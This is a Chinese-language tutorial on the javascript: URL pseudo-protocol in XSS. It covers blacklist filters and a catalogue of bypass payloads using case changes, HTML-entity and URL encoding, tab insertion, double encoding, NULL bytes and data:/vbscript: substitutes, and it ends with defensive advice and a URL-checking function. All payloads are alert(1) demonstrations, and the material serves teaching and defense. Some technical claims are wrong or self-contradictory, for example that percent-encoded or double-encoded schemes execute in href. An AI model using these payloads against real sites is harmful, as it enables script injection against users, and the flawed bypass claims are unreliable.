# 1.js伪协议介绍
javascript: 是浏览器的一种特殊 URL 协议——跟在它后面的内容会被浏览器当作 JavaScript 代码执行。它不是真正的网络协议（不像 `https://`），而是浏览器引擎的内置约定。
## 1.1触发场景
| 场景                 | 示例代码                                          | 触发条件              |
| ------------------ | --------------------------------------------- | ----------------- |
| `<a>` 的 href       | `<a href="javascript:alert(1)">点我</a>`        | 用户点击链接            |
| `<iframe>` 的 src   | `<iframe src="javascript:alert(1)"></iframe>` | iframe 加载时（部分浏览器） |
| `location.href` 赋值 | `location.href = "javascript:alert(1)";`      | JS 运行时动态跳转        |
| `<form>` 的 action  | `<form action="javascript:alert(1)">`         | 表单提交时             |
| `window.open()`    | `window.open("javascript:alert(1)");`         | JS 触发新窗口时         |
关键：javascript: 不同于 onerror / onload 这类事件处理器——它不需要 HTML 属性，只需要被浏览器识别为一个「可执行的 URL」。这意味着它的**攻击面更大**：任何让浏览器解析 URL 的地方都是潜在入口。
# 2.常见过滤策略（WAF / 代码层面）
防御方的典型做法是黑名单匹配——检测输入中是否含有关键字，有则拦截或净化。

| 过滤策略         | 检测逻辑                                               | 示例（被拦截）                                |
| ------------ | -------------------------------------------------- | -------------------------------------- |
| 精确匹配         | `str.includes('javascript:')` 或正则 `/javascript:/i` | `javascript:alert(1)` → 拦截             |
| 小写匹配         | `str.toLowerCase().includes('javascript:')`        | `JAVASCRIPT:alert(1)` → 拦截             |
| URL 编码检测     | 先解码再匹配                                             | `javascript%3Aalert(1)` → 拦截           |
| HTML 实体检测    | 先解码 HTML entity 再匹配                                | `javascript:...` → 拦截                  |
| DOMPurify 默认 | 剥离所有 `javascript:` URL                             | `<a href="javascript:...">` → href 被移除 |
**过滤的弱点**：黑名单永远不完整。字符编码、空白字符、HTML 解析的「宽容模式」会产生无穷多的等价表示——防御方必须预测所有可能，攻击方只需要找到一条漏网之鱼。
# 3.绕过技巧库
## 3.1 大小写变体
原理：HTML 属性值不区分大小写，JS 引擎对协议头也用大小写不敏感的方式解析。但很多简单过滤器用精确字符串匹配或 toLowerCase() 只覆盖了一部分情况。

| Payload | 简单正则 `/javascript:/i` | 精确 `'javascript:'` |
| ---- | ---- | ---- |
| `javascript:alert(1)` | 拦截 | 拦截 |
| `JavaScript:alert(1)` | 拦截 | ✅ 通过 |
| `jAvAsCrIpT:alert(1)` | 拦截 | ✅ 通过 |
| `JAVASCRIPT:alert(1)` | 拦截 | ✅ 通过 |
## 3.2 Tab / 换行符插入
原理：HTML 解析器在属性值中把 `&#x09;`（Tab）、`&#x0A;`（换行）、`&#x0D;`（回车）视为空白字符。如果过滤器只匹配连续的 javascript: 字符串，在这些字符间插入空白就能绕过。

```js
//  原始载荷（直接写，会被过滤器匹配）
<a href="javascript:alert(1)">click</a>

//  绕过 1：首字符 HTML 实体编码——j = 字母 j
<a href="&#x6A;avascript:alert(1)">click</a>

//  绕过 2：冒号 HTML 实体编码——: = 冒号 ':'
<a href="javascript&#x3A;alert(1)">click</a>

//  绕过 3：全量十六进制编码——每个字符都用 &#xNN;
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>

//  绕过 4：Tab 字符插入——	 在 java 和 script 之间插入制表符
<a href="java&#x09;script:alert(1)">click</a>
//                  ^^^^^^  browser 解析 HTML 实体 → \t → 协议名仍然被识别
```

| 技巧 | Payload片段 | 说明 |
| ---- | ---- | ---- |
| 编码首字符 | `&#x6A;avascript:` | `&#x6A;` = j，打破精确字符串匹配，toLowerCase后仍是j → 仍被匹配 |
| 编码冒号 | `javascript&#x3A;alert(1)` | 冒号编码为 `&#x3A;`，正则 `/javascript:/` 失效 |
| 全量编码 | `&#x6A;&#x61;&#x76;&#x61;...&#x3A;...` | 每个字符都用十六进制HTML实体，彻底绕过关键词匹配 |
| Tab插入 | `java&#x09;script:alert(1)` | `&#x09;` = \t，HTML属性值中制表符被忽略，但打破了字符串连续性 |
> [!important]  注意
> HTML 实体编码在 HTML 属性值中 生效（如 `href="..."`），但在 `location.href = "..."` 这种纯 JS 上下文中不生效——后者需要 URL 编码（`%6A` 等）。
## 3.3 URL 编码绕过
原理：在 HTML 属性值中，URL 编码（百分号编码）会被浏览器在取 URL 时自动解码。可以用它来混淆 javascript: 中的关键字符。

| 编码方式 | Payload                                     | 效果                    |
| ---- | ------------------------------------------- | --------------------- |
| 冒号编码 | `javascript%3Aalert(1)`                     | `%3A` = `:`，绕过匹配冒号的正则 |
| 全量编码 | `%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)` | 每个字符都用 `%XX`，完全不可读    |
## 3.4 组合绕过
原理：真实 WAF 会组合多种检测。需要多层编码叠加来穿透。
```js
// ⭐ 过滤器做了：toLowerCase → URL 解码 → 匹配 /javascript:/
// 场景：用户输入先经过过滤器，通过后才写入 HTML 属性

// 尝试 1：直接写 → 拦截
javascript:alert(1)

// 尝试 2：URL 编码 → 过滤器解码后看到 javascript: → 拦截
javascript%3Aalert(1)

// ⭐ 尝试 3：HTML 实体 + URL 编码混用 → 过滤器只做 URL 解码
//   href="&#106;avascript%3Aalert(1)"
//   浏览器先解 HTML 实体 → javascript%3Aalert(1)
//   再解 URL 编码 → javascript:alert(1)   ✅ 执行
//   过滤器只 URL 解码 "&#106;avascript%3Aalert(1)"
//   → 得到 "&#106;avascript:alert(1)" → 不含 "javascript:" → 放过！

// ⭐ 尝试 4：真正的双层 URL 编码（如果过滤器只解一轮）
//   第 1 层编码：%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)
//   再编码 % 本身：%25 = '%'，所以 %6A → %256A
//   → %256A%2561%2576%2561...
//   过滤器解一轮 → %6A%61%76%61... → 不含 "javascript:" → 放过
//   浏览器解析 href 时再解一轮 → javascript:alert(1) → ✅ 执行
```
## 3.5 利用浏览器解析容错

| 技巧              | Payload                                    | 原理                                                  |
| --------------- | ------------------------------------------ | --------------------------------------------------- |
| NULL字节截断        | `java%00script:alert(1)`                   | 某些后端（Java/C）在`%00`处截断字符串，看到的只有`java`，但浏览器忽略NULL继续解析 |
| 多余冒号            | `javascript::alert(1)`                     | 协议解析允许连续的冒号                                         |
| VBScript混用（仅IE） | `vbscript:msgbox(1)`                       | IE支持VBScript伪协议，如果过滤器只匹配javascript就可以绕              |
| data:协议替代       | `data:text/html,<script>alert(1)</script>` | 在iframe src等场景中可用data:替代javascript:                 |
# 4.防御：正确做法
| 做法          | 推荐程度  | 为什么                                                                  |
| ----------- | ----- | -------------------------------------------------------------------- |
| 黑名单匹配关键字    | ❌ 不推荐 | 编码变体无穷无尽，永远补不完                                                       |
| 白名单允许协议     | ⚠️ 凑合 | 只允许 `http:` / `https:` / `mailto:`，拒绝其他。但 `data:` 也可能被滥用             |
| URL解析后检查    | ✅ 较好  | 先完整解码（HTML实体 + URL编码），再用 `URL()` 构造函数解析出protocol，检查是否为 `javascript:` |
| DOMPurify   | ⭐ 最佳  | 专业XSS净化库，默认剥离 `javascript:` 等危险协议，且持续更新绕过补丁                          |
| CSP（内容安全策略） | ⭐ 纵深  | `script-src 'self'` 禁止内联脚本，即使 `javascript:` 被注入了也无法执行                |
```
// ⭐ 正确做法示例：用 URL API 解析 protocol
function isSafeURL(input) {
  // 关键：先通过 DOM 解析触发 HTML 实体解码
  var tmp = document.createElement('a');
  tmp.href = input;
  // 用 URL 构造函数也能达到同样效果（现代浏览器）
  // var u = new URL(input, location.origin);
  // return u.protocol === 'http:' || u.protocol === 'https:';
  
  return tmp.protocol === 'http:' || tmp.protocol === 'https:' || tmp.protocol === 'mailto:';
  //tmp.protocol这三种情况就转小写，其他就拦截
}
```
